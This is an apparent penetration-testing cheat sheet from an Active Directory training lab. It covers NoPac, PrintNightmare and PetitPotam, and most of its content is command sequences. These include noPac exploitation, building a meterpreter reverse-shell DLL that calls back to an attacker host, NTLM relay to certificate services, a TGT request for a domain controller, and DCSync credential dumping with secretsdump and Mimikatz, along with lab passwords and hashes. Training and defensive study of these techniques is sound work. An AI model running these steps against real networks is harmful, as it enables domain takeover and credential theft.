## Bleeding Edge Vulnerabilities

### NoPac (SamAccountName Spoofing)

|CVEs|Description|
|----|-----------|
|CVE 2021-42278| Bypass vulnerability with the Security Account Manager (SAM).|
|CVE 2021-42287| Vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

Exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller.

```bash
## Prerequisites
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git

## Scanning for NoPac Vulnerability
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

## Running NoPac Exploit
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

## Using NoPac to DCSync Built-in Admin Account
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare

PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. 

```bash
## Prerequisites
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 -m pip install .

## Enumerate for MS-RPRN
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

## Generate DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

## Host payload on SMB share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

## Configure meterpreter options & Run exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

### PetitPotam (MS-EFSRPC)

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC).

This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

```bash
## Start ntlmrelay
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

## Start PetitPotam
python3 PetitPotam.py 172.16.5.225 172.16.5.5

## Catching Base64 Encoded Cert for DC
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

## Request TGT for DC
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

## Save TGT for Kerberos authentication attempts
export KRB5CCNAME=dc01.ccache

## Use DC TGT to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

## Verify admin access to DC with CrackMapExec

## Alternative: TGS Request for ourselves
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

## Use DC NTLM Hash to DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

```powershell
## Request TGT & Perform PTT
## Use base64 encoded certificate
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

## DCSync with Mimikatz
lsadump::dcsync /user:inlanefreight\krbtgt
```